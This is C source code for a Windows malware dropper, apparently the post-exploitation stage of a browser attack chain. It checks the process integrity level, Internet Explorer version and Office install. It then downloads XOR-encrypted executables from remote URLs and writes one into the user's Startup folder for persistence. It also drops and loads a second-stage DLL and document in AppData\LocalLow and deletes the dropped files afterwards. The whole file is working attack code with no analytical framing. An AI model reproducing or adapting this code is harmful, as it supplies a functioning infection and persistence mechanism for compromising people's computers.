#include "Source.h"
#include "BinPatchedVars.h"


VOID DoExitProc()
{
	ZwTerminateProcess_p fpZWTerminateProcess = (ZwTerminateProcess_p) GetProcAddress(LoadLibrary(L"ntdll"), "ZwTerminateProcess");

	fpZWTerminateProcess(GetCurrentProcess(), 0);
}

BOOL CheckForOffice()
{
	HKEY hKey;
	CLSID pClsID;
	LPOLESTR lpOleStr;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Office\\12.0", 0, KEY_READ, &hKey) == ERROR_SUCCESS ||	// office 2007
		RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Office\\14.0", 0, KEY_READ, &hKey) == ERROR_SUCCESS ||	// office 2010
		RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Office\\15.0", 0, KEY_READ, &hKey) == ERROR_SUCCESS)	// office 2013
	{
		RegCloseKey(hKey);
	
		lpOleStr = SysAllocString(L"Word.Application");
		if (CLSIDFromProgID(lpOleStr, &pClsID) == S_OK)
			return TRUE;
	}

	return FALSE;
}

BOOL IsLowIntegrity()
{
	DWORD bRet = -1;
	
	HANDLE hToken;
	HANDLE hProcess;

	DWORD dwLengthNeeded;
	DWORD dwError = ERROR_SUCCESS;

	PTOKEN_MANDATORY_LABEL pTIL = NULL;
	DWORD dwIntegrityLevel;

	hProcess = GetCurrentProcess();
	if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) 
	{
		// Get the Integrity level.
		if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLengthNeeded))
		{
			dwError = GetLastError();
			if (dwError == ERROR_INVALID_PARAMETER) // xp
				bRet = FALSE;

			if (dwError == ERROR_INSUFFICIENT_BUFFER)
			{
				pTIL = (PTOKEN_MANDATORY_LABEL)VirtualAlloc(NULL, dwLengthNeeded, MEM_COMMIT, PAGE_READWRITE);
				if (GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLengthNeeded, &dwLengthNeeded))
				{
					dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid)-1));
					if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID)
						bRet = FALSE;
					else
						bRet = TRUE;
				}
				VirtualFree(pTIL, 0x0, MEM_RELEASE);
			}
		}
		CloseHandle(hToken);
	}

	if (bRet == -1)
		return TRUE; // FIXME

	return bRet;
}

BOOL PathExists(__in LPWSTR strPath)
{
	if (GetFileAttributes(strPath) == INVALID_FILE_ATTRIBUTES)
		return FALSE;

	return TRUE;
}

LPWSTR GetStartupPath()
{
	LPWSTR strLongPath = (LPWSTR) VirtualAlloc(NULL, 0x8000*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
	LPWSTR strShortPath = (LPWSTR) VirtualAlloc(NULL, 0x8000*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);

	if (!SHGetSpecialFolderPath(NULL, strLongPath, CSIDL_STARTUP, TRUE))
		SHGetSpecialFolderPath(NULL, strLongPath, CSIDL_STARTUP, FALSE);

	GetShortPathName(strLongPath, strShortPath, 0x8000);
	VirtualFree(strLongPath, 0, MEM_RELEASE);

	PathAddBackslash(strShortPath);

	if (!PathExists(strShortPath))
	{
		VirtualFree(strShortPath, 0, MEM_RELEASE);
		return NULL;
	}

	return strShortPath;
}

LPWSTR GetLowIntegrityTemp(BOOL bLowIntegrity)
{
	LPWSTR strTempPath = NULL;

	if (bLowIntegrity)
	{
		SHGetKnownFolderPath_p fpSHGetKnownFolderPath = (SHGetKnownFolderPath_p) GetProcAddress(LoadLibrary(L"SHELL32"), "SHGetKnownFolderPath");
		if (!fpSHGetKnownFolderPath || fpSHGetKnownFolderPath(FOLDERID_LocalAppDataLow, 0, NULL, &strTempPath) != S_OK)
			return NULL;
	}
	else
	{
		strTempPath = (LPWSTR) VirtualAlloc(NULL, 0x8000*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
		if (!GetTempPath(0x8000, strTempPath))
		{
			VirtualFree(strTempPath, 0, MEM_RELEASE);
			return NULL;
		}
	}

	PathAddBackslash(strTempPath);

	if (!PathExists(strTempPath))
	{
		VirtualFree(strTempPath, 0, MEM_RELEASE);
		return NULL;
	}

	return strTempPath;
}

LPBYTE DownloadAndDecrypt(__in LPWSTR strUrl, __in LPDWORD dwFileLen, __in DWORD dwXorKey, BOOL bXored)
{
	CHAR strBuff[17];
	HINTERNET hInternet;
	DWORD dwBuffLen, dwIdx;
	
	hInternet = InternetOpen(USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet)
	{
		HINTERNET hUrl = InternetOpenUrl(hInternet, strUrl, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE|INTERNET_FLAG_PRAGMA_NOCACHE, NULL);
		if (hUrl)
		{
			dwBuffLen = 16;
			dwIdx = 0;

			HttpQueryInfo(hUrl, HTTP_QUERY_CONTENT_LENGTH, strBuff, &dwBuffLen, &dwIdx);
			*dwFileLen = _wtoi((LPWSTR)strBuff);

			LPBYTE lpFileBuffer = (LPBYTE) VirtualAlloc(NULL, *dwFileLen, MEM_COMMIT, PAGE_READWRITE);			
			if (DownloadFile(hUrl, lpFileBuffer, *dwFileLen))
			{
				if (bXored)
					return Decrypt(lpFileBuffer, *dwFileLen, dwXorKey);
				else
					return lpFileBuffer;
			}
		}
	}

	return NULL;
}

BOOL DownloadFile(__in HINTERNET hUrl, __in LPBYTE lpBuffer, __in DWORD dwBufferLen)
{
	DWORD dwOut;
	DWORD dwRead = 0;

	while (InternetReadFile(hUrl, lpBuffer + dwRead, dwBufferLen, &dwOut))
	{
		dwRead += dwOut;
		dwBufferLen -= dwOut;

		if (!dwBufferLen)
			return TRUE;

		if (!dwRead)
			return FALSE;
	}

	return FALSE;
}

LPBYTE Decrypt(__in LPBYTE lpBuffer, __in DWORD dwBuffLen, __in DWORD dwXorKey)
{
	LPDWORD lpD = (LPDWORD) lpBuffer;
	LPBYTE lpB = (LPBYTE) lpBuffer;

	for (UINT i=0; i<dwBuffLen/4; i++)
		lpD[i] ^= dwXorKey;
	for (UINT i=dwBuffLen - (dwBuffLen%4); i<dwBuffLen; i++)
		lpB[i] ^= 0x41;

	return lpBuffer;
}

BOOL DropFile(__in LPWSTR strFileName, __in LPBYTE lpFileBuffer, __in DWORD dwFileSize)
{
	DWORD dwOut;
	HANDLE hFile;

	hFile = CreateFile(strFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	WriteFile(hFile, lpFileBuffer, dwFileSize, &dwOut, NULL);
	CloseHandle(hFile);

	return TRUE;
}


int main()
{
	DWORD dwScoutSize;
	LPBYTE lpScoutBuffer;
	HMODULE hMod = NULL;

	BOOL bLowIntegrity = IsLowIntegrity();
	LPWSTR strTempPath = GetLowIntegrityTemp(bLowIntegrity);
	LPWSTR strStartupPath = GetStartupPath();

	if (!strTempPath || !strStartupPath)
		DoExitProc();

	PathAppend(strStartupPath, SCOUT_NAME);

	if (!bLowIntegrity)
	{
		lpScoutBuffer = DownloadAndDecrypt(SCOUT_URL, &dwScoutSize, XOR_KEY, XOR_KEY ? TRUE : FALSE);
		if (lpScoutBuffer != NULL && lpScoutBuffer[0] == 'M' && lpScoutBuffer[1] == 'Z')
			DropFile(strStartupPath, lpScoutBuffer, dwScoutSize);

		DWORD strLen = 0x1000;
		LPBYTE strIEVersion = (LPBYTE) VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);

		HKEY hKey;
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Internet Explorer", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
		{
			if (RegQueryValueEx(hKey, L"Version", NULL, NULL, strIEVersion, &strLen) == ERROR_SUCCESS)
			{
				if (strIEVersion[0] < '8')
				{
					LPWSTR strIEPath = (LPWSTR) VirtualAlloc(NULL, 0x8000*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
					GetModuleFileName(NULL, strIEPath, 0x8000);
					
					LPWSTR strIEArgs = (LPWSTR) VirtualAlloc(NULL, 0x8000*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);

					WCHAR strQuote = '"';
					WCHAR strSpace = ' ';
					
					strIEArgs[0] = L'\0';
					wcscat(strIEArgs, &strQuote); wcscat(strIEArgs, strIEPath);	wcscat(strIEArgs, &strQuote);
					wcscat(strIEArgs, &strSpace);
					wcscat(strIEArgs, &strQuote); wcscat(strIEArgs, ORIGINAL_URL); wcscat(strIEArgs, &strQuote);

					STARTUPINFO si;
					PROCESS_INFORMATION pi;
					
					SecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
					SecureZeroMemory(&si, sizeof(STARTUPINFO));
					si.cb = sizeof(STARTUPINFO);

					CreateProcess(NULL, strIEArgs, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
				}
			}
		}

		DoExitProc(); // all done.
	}

	// low integrity, first check if Word is installed
	/*
	CLSID pClsID;
	LPOLESTR lpOleStr = SysAllocString(L"Word.Application");
	if (CLSIDFromProgID(lpOleStr, &pClsID) != S_OK)
		ExitProcess(0); 
	*/
	if (!CheckForOffice())
		DoExitProc();

	// download third stage
	DWORD dwStage3Size;
	LPBYTE lpStage3Buffer = DownloadAndDecrypt(STAGE3_URL, &dwStage3Size, XOR_KEY, XOR_KEY ? TRUE : FALSE);

	DWORD dwLibSize = *(LPDWORD) lpStage3Buffer;
	DWORD dwDocSize = *(LPDWORD) (lpStage3Buffer + sizeof(DWORD));

	LPBYTE lpLibBuffer = lpStage3Buffer + sizeof(DWORD)*2;
	LPBYTE lpDocBuffer = lpLibBuffer + dwLibSize;

	LPWSTR strLibPath = (LPWSTR) VirtualAlloc(NULL, 0x8000*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
	LPWSTR strDocPath = (LPWSTR) VirtualAlloc(NULL, 0x8000*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
	LPWSTR strScoutPath = (LPWSTR) VirtualAlloc(NULL, 0x8000*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);

	memcpy(strLibPath, strTempPath, (wcslen(strTempPath)+1)*sizeof(WCHAR));
	memcpy(strDocPath, strTempPath, (wcslen(strTempPath)+1)*sizeof(WCHAR));
	memcpy(strScoutPath, strTempPath, (wcslen(strTempPath)+1)*sizeof(WCHAR));

	PathAppend(strLibPath, DLL_TEMP_NAME);
	PathAppend(strDocPath, DOC_TEMP_NAME);
	PathAppend(strScoutPath, SCOUT_TEMP_NAME);

	// drop files in %USERPROFILE%\AppData\LocalLow
	if (!DropFile(strLibPath, lpLibBuffer, dwLibSize) || !DropFile(strDocPath, lpDocBuffer, dwDocSize))
	{
		DeleteFile(strLibPath);
		DeleteFile(strDocPath);
		
		DoExitProc();
	}


	hMod = LoadLibrary(strLibPath);
	MYEXPORT fpExport = (MYEXPORT) GetProcAddress(hMod, EXPORT_NAME);
	if (fpExport)
	{
		lpScoutBuffer = DownloadAndDecrypt(SCOUT_URL, &dwScoutSize, XOR_KEY, XOR_KEY ? TRUE : FALSE);
		if (lpScoutBuffer != NULL && lpScoutBuffer[0] == 'M' && lpScoutBuffer[1] == 'Z')
		{
			if (DropFile(strScoutPath, lpScoutBuffer, dwScoutSize))
			{
				DWORD pArgs[] = {(DWORD)strDocPath, (DWORD)strScoutPath, (DWORD)strStartupPath};

				HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)fpExport, &pArgs, 0, NULL);
				WaitForSingleObject(hThread, 30000); // FIXME
				TerminateThread(hThread, 0x0);
			}
		}
	}
	
	if (hMod)
	{
		if (!FreeLibrary(hMod))
			if (!FreeLibrary(hMod))
				FreeLibrary(hMod);
		FreeLibrary(hMod);
	}

	DeleteFile(strLibPath);
	DeleteFile(strDocPath);
	DeleteFile(strScoutPath);  

																												
	DoExitProc();
}